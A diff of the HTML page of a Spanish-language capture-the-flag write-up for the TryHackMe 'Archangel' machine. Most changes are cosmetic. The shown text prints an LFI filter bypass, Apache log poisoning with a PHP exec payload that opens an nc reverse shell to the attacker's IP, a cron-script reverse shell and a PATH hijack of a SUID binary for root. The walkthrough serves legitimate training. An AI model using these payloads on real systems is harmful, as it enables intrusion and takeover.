@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Archangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina. Modificamos un script que es ejecutado por un cron para realizar movimiento lateral. Finalmente un archivo con permisos SUID y la lectura de su codigo fuente permitió que ejecutaramos bash como root.">
   
 
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1608,10 +1608,10 @@
   <li><a href="https://sckull.github.io/tags/lfi-log-poisoning/" class="single__tag" title="lfi log poisoning">lfi log poisoning</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/rce/" class="single__tag" title="rce">rce</a></li>
+  <li><a href="https://sckull.github.io/tags/suid/" class="single__tag" title="suid">suid</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/suid/" class="single__tag" title="suid">suid</a></li>
+  <li><a href="https://sckull.github.io/tags/rce/" class="single__tag" title="rce">rce</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/ghidra/" class="single__tag" title="ghidra">ghidra</a></li>
@@ -1661,11 +1661,11 @@
 </tr>
 </tbody>
 </table>
-<h1 id="nmap">NMAP</h1>
+<h1 id="nmap-">NMAP</h1>
 <p>Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1695,7 +1695,7 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Feb  4 19:10:33 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan archangel.thm</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Feb  4 19:10:33 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan archangel.thm</span>
 Warning: 10.10.84.37 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span>.
 Nmap scan report <span class="k">for</span> archangel.thm <span class="o">(</span>10.10.84.37<span class="o">)</span>
 Host is up <span class="o">(</span>0.31s latency<span class="o">)</span>.
@@ -1725,16 +1725,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Thu Feb  4 19:14:04 2021 -- 1 IP address (1 host up) scanned in 34.20 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="http">HTTP</h1>
+</div><h1 id="http-">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80 y nuevo dominio.<br />
 <img src="/images/posts/thm/archangel/Screenshot_20210204_181544.png" alt="" /></p>
 <p>En el dominio encontrado vemos nuestra primera flag.<br />
 <img src="/images/posts/thm/archangel/Screenshot_20210204_181657.png" alt="" /></p>
-<h2 id="rustbuster">RUSTBUSTER</h2>
+<h2 id="rustbuster-">RUSTBUSTER</h2>
 <p>Utilizamos rustbuster para busqueda de directorios y archivos en el dominio encontrado.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1761,7 +1761,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">~ rustbuster v3.0.3 ~ by phra <span class="p">&amp;</span> ps1dr3x ~
+<pre class="chroma"><code class="language-bash" data-lang="bash">~ rustbuster v3.0.3 ~ by phra <span class="p">&amp;</span> ps1dr3x ~
 
          _     _                 _         _           _        _                 _         _           _           _     
         /<span class="se">\ \ </span> /<span class="se">\_\ </span>             / /<span class="se">\ </span>     /<span class="se">\ \ </span>       / /<span class="se">\ </span>    /<span class="se">\_\ </span>             / /<span class="se">\ </span>     /<span class="se">\ \ </span>       /<span class="se">\ \ </span>       /<span class="se">\ \ </span>  
@@ -1788,11 +1788,11 @@ GET     <span class="m">200</span> OK                          http://mafialive.
 <span class="o">[</span>?<span class="o">]</span> Ended at: 2021-02-04 19:23:171
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="lfi---www-data-user">LFI - WWW-DATA (USER)</h1>
+</div><h1 id="lfi---www-data-user-">LFI - WWW-DATA (USER)</h1>
 <p>En la pagina <code>test.php</code> vemos que existe una vulnerabilidad LFI ya que se le esta pasando al parametro <code>view</code> la direccion completa del archivo a mostrar en la pagina.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1806,7 +1806,7 @@ GET     <span class="m">200</span> OK                          http://mafialive.
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&lt;!DOCTYPE HTML&gt;
+<pre class="chroma"><code class="language-bash" data-lang="bash">&lt;!DOCTYPE HTML&gt;
 &lt;html&gt;
 
 &lt;head&gt;
@@ -1823,7 +1823,7 @@ GET     <span class="m">200</span> OK                          http://mafialive.
 </div><p>Utilizamos un filtro de PHP para leer y codificar en base64 el archivo <code>test.php</code> con lo que obtuvimos el codigo fuente codificado y al decodificarlo encontramos nuestra segunda flag. Vemos en el codigo que el parametro que se le pase a <code>view</code> debe de tener el string <code>/var/www/html/development_testing</code> y este no debe de contener <code>../..</code> por lo que no podriamos leer algun archivo en otra direccion y es necesario buscar y realizar bypas a esta condicional. Para poder hacer un <a href="https://security.stackexchange.com/a/240122"><strong>&ldquo;bypass&rdquo;</strong></a> a esta pequeña condicional se incluye la direccion <code>/var/www/html/development_testing</code> dentro de un filtro lo cual nos permitiria leer cualquier archivo.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1845,7 +1845,7 @@ GET     <span class="m">200</span> OK                          http://mafialive.
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/html/development_testing/test.php
+<pre class="chroma"><code class="language-bash" data-lang="bash">php://filter/convert.base64-encode/resource<span class="o">=</span>/var/www/html/development_testing/test.php
 <span class="o">[</span>... REDACTED ...<span class="o">]</span>	
 &lt;/button&gt;&lt;/a&gt; &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/test.php?view=/var/www/html/development_testing/mrrobot.php&#34;</span>&gt;&lt;button <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;secret&#34;</span>&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;
 &lt;?php
@@ -1874,16 +1874,16 @@ GET     <span class="m">200</span> OK                          http://mafialive.
 <p>Realizamos una enumeracion de archivos pero no encontramos alguna contraseña, verificamos que tuvieramos acceso a los logs de acceso de apache (<code>/var/log/apache2/acess.log</code>) logramos leer dicho archivo.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">10.2.29.162 - - <span class="o">[</span>05/Feb/2021:08:07:19 +0530<span class="o">]</span> <span class="s2">&#34;GET /robots.txt HTTP/1.1&#34;</span> <span class="m">404</span> <span class="m">455</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;</span> 10.2.29.162 - - <span class="o">[</span>05/Feb/2021:08:07:22 +0530<span class="o">]</span> <span class="s2">&#34;GET /test.php?view=/var/www/html/development_testing/../../../../../../log/apache2/access.log HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">559</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;</span> 10.2.29.162 - - <span class="o">[</span>05/Feb/2021:08:07:38 +0530<span class="o">]</span> <span class="s2">&#34;GET /test.php?view=/var/www/html/development_testing/..///////..////..//////..///////..////..///////var/log/apache2/access.log HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">606</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">10.2.29.162 - - <span class="o">[</span>05/Feb/2021:08:07:19 +0530<span class="o">]</span> <span class="s2">&#34;GET /robots.txt HTTP/1.1&#34;</span> <span class="m">404</span> <span class="m">455</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;</span> 10.2.29.162 - - <span class="o">[</span>05/Feb/2021:08:07:22 +0530<span class="o">]</span> <span class="s2">&#34;GET /test.php?view=/var/www/html/development_testing/../../../../../../log/apache2/access.log HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">559</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;</span> 10.2.29.162 - - <span class="o">[</span>05/Feb/2021:08:07:38 +0530<span class="o">]</span> <span class="s2">&#34;GET /test.php?view=/var/www/html/development_testing/..///////..////..//////..///////..////..///////var/log/apache2/access.log HTTP/1.1&#34;</span> <span class="m">200</span> <span class="m">606</span> <span class="s2">&#34;-&#34;</span> <span class="s2">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Ya que tenemos acceso a este archivo podemos verificar que sea posible ejecutar codigo para ello realizamos una prueba con <code>phpinfo()</code> enviandolo a travez de una solicitud GET, al revisar el archivo <code>access.log</code> logramos ver que se ejecuto dicha funcion.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1904,7 +1904,7 @@ GET     <span class="m">200</span> OK                          http://mafialive.
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/archangel$ nc mafialive.thm <span class="m">80</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/archangel$ nc mafialive.thm <span class="m">80</span>
 GET /&lt;?php phpinfo<span class="o">()</span><span class="p">;</span> ?&gt;
 HTTP/1.1 <span class="m">400</span> Bad Request
 Date: Fri, <span class="m">05</span> Feb <span class="m">2021</span> 00:54:45 GMT
@@ -1929,7 +1929,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 <p>Sabiendo esto podemos realizar <a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1"><strong>Log Poisoning</strong></a> enviando codigo php para ejecucion de comandos en una peticion GET y al realizar la lectura del log el codigo se ejecutaría. Existen varias formas de ejecutar comandos se muestra: <a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">link</a> se muestra <code>&lt;?php system($_GET['cmd']); &gt;</code> aunque es necesario pasar el comando en el parametro <code>cmd</code> al realizar la lectura. Al intentar con varias funciones solo una funcionó, <code>exec</code> ya que las demás no dejaban que realizaramos la lectura del archivo <code>access.log</code>. El codigo enviado fue el siguiente: <code>&lt;?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1338 &gt;/tmp/f') ?&gt;</code> con el cual logramos obtener una shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1950,7 +1950,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </span><span class="lnt">19
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/archangel$ nc mafialive.thm <span class="m">80</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/archangel$ nc mafialive.thm <span class="m">80</span>
 GET /&lt;?php exec<span class="o">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.29.162 1338 &gt;/tmp/f&#39;</span><span class="o">)</span> ?&gt;
 HTTP/1.1 <span class="m">400</span> Bad Request
 Date: Fri, <span class="m">05</span> Feb <span class="m">2021</span> 02:53:46 GMT
@@ -1972,11 +1972,11 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/archangel/Screenshot_20210204_205822.png" alt="" /></p>
-<h1 id="archangel---user">ARCHANGEL - USER</h1>
+<h1 id="archangel---user-">ARCHANGEL - USER</h1>
 <p>Realizamos una enumeracion en la maquina y encontramos en el archivo crontab un script el cual es ejecutado por <code>archangel</code>, dicho archivo tiene permisos de escritura, lectura y ejecucion para todos los usuarios y se ejecuta cada minuto. Agregamos una shell inversa al script y logramos obtener una shell con este usuario y nuestra segunda flag <code>user2.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1998,7 +1998,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@ubuntu:/$ cat /etc/crontab
+<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@ubuntu:/$ cat /etc/crontab
 <span class="o">[</span>... REDACTED ...<span class="o">]</span>
 
 <span class="c1"># m h dom mon dow user	command</span>
@@ -2007,7 +2007,7 @@ Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><
 <span class="m">25</span> 6	* * *	root	<span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="o">)</span>
 <span class="m">47</span> 6	* * 7	root	<span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="o">)</span>
 <span class="m">52</span> 6	<span class="m">1</span> * *	root	<span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="o">)</span>
-<span class="c1">#</span>
+#
 www-data@ubuntu:/$ cat /opt/helloworld.sh
 cat /opt/helloworld.sh
 <span class="c1">#!/bin/bash</span>
@@ -2023,7 +2023,7 @@ www-data@ubuntu:/$
 </div><p><img src="/images/posts/thm/archangel/Screenshot_20210204_210747.png" alt="" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2053,7 +2053,7 @@ www-data@ubuntu:/$
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">archangel@ubuntu:~$ ls -lah
+<pre class="chroma"><code class="language-bash" data-lang="bash">archangel@ubuntu:~$ ls -lah
 ls -lah
 total 48K
 drwxr-xr-x <span class="m">7</span> archangel archangel 4.0K Feb  <span class="m">5</span> 08:38 .
@@ -2083,10 +2083,10 @@ thm<span class="o">{[</span>... REDACTED ...<span class="o">]}</span>
 archangel@ubuntu:~/secret$
 </code></pre></td></tr></table>
 </div>
-</div><h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
+</div><h1 id="privilege-escalation-">PRIVILEGE ESCALATION</h1>
 <p>Hacemos una pequeña enumeracion en busqueda de ejecutables con permisos SUID, logramos encontrar un archivo (<code>backup</code>) el cual realiza una copia de todos los archivos de la carpeta <code>myfiles</code> hacia <code>/opt/backupfiles</code>, lo que no se toma en cuenta en el codigo es la direccion completa de <code>cp</code>, por lo que podriamos modificar la variable <code>$PATH</code> para que tome otro ejecutable llamado <code>cp</code> antes que el original (<code>/bin/cp</code>).<br />
 
-<div id="69ad1409640af1dc" class="codetab">
+<div id="e1a7d7289b458a38" class="codetab">
   <div class="codetab__links">
     
       <button class="codetab__link" aria-label="Tab link">bash</button>
@@ -2099,7 +2099,7 @@ archangel@ubuntu:~/secret$
 <div id="c41bea3acae43a54" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2125,7 +2125,7 @@ archangel@ubuntu:~/secret$
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">archangel@ubuntu:~/secret$ find / -perm -4000 2&gt;/dev/null <span class="p">|</span>xargs ls -lah
+<pre class="chroma"><code class="language-bash" data-lang="bash">archangel@ubuntu:~/secret$ find / -perm -4000 2&gt;/dev/null <span class="p">|</span>xargs ls -lah
 -rwsr-xr-x <span class="m">1</span> root root        31K Aug <span class="m">11</span>  <span class="m">2016</span> /bin/fusermount
 -rwsr-xr-x <span class="m">1</span> root root        43K Sep <span class="m">17</span> 00:13 /bin/mount
 -rwsr-xr-x <span class="m">1</span> root root        63K Jun <span class="m">28</span>  <span class="m">2019</span> /bin/ping
@@ -2157,7 +2157,7 @@ archangel@ubuntu:~/secret$
 <div id="44bd7a5588ab4a40" class="codetab__content">
   <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2167,7 +2167,7 @@ archangel@ubuntu:~/secret$
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 
 <span class="p">{</span>
   <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
@@ -2185,7 +2185,7 @@ archangel@ubuntu:~/secret$
 <script>
   'use strict';
 
-  var containerId = JSON.parse("\"69ad1409640af1dc\"");
+  var containerId = JSON.parse("\"e1a7d7289b458a38\"");
   var containerElem = document.getElementById(containerId);
   var codetabLinks = null;
   var codetabContents = null;
@@ -2222,7 +2222,7 @@ archangel@ubuntu:~/secret$
 <p>Creamos un script para que ejecute <code>bash</code> con el nombre <code>cp</code> y le damos permisos de ejecucion, tambien agregamos al inicio la direccion <code>/home/archangel/secret</code> a la variable <code>PATH</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2234,7 +2234,7 @@ archangel@ubuntu:~/secret$
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">archangel@ubuntu:~/secret$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; cp
+<pre class="chroma"><code class="language-bash" data-lang="bash">archangel@ubuntu:~/secret$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; cp
 <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; cp
 archangel@ubuntu:~/secret$ chmod +x cp
 chmod +x cp
@@ -2353,7 +2353,7 @@ archangel@ubuntu:~/secret$
     </div>
     <div class="whoami__desc">
       
-        Pentester wannabe
+        CTF Player | RedTeamer &amp; Pentester wannabe
       
     </div>
     <div class="whoami__social">
@@ -2539,7 +2539,7 @@ archangel@ubuntu:~/secret$
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3651,15 +3651,15 @@ var a = document.getElementsByClassName('navbar__menu-item')
           <nav id="TableOfContents">
   <ul>
     <li><a href="#room">Room</a></li>
-    <li><a href="#nmap">NMAP</a></li>
-    <li><a href="#http">HTTP</a>
+    <li><a href="#nmap-">NMAP</a></li>
+    <li><a href="#http-">HTTP</a>
       <ul>
-        <li><a href="#rustbuster">RUSTBUSTER</a></li>
+        <li><a href="#rustbuster-">RUSTBUSTER</a></li>
       </ul>
     </li>
-    <li><a href="#lfi---www-data-user">LFI - WWW-DATA (USER)</a></li>
-    <li><a href="#archangel---user">ARCHANGEL - USER</a></li>
-    <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+    <li><a href="#lfi---www-data-user-">LFI - WWW-DATA (USER)</a></li>
+    <li><a href="#archangel---user-">ARCHANGEL - USER</a></li>
+    <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
   </ul>
 </nav>          
         </div>
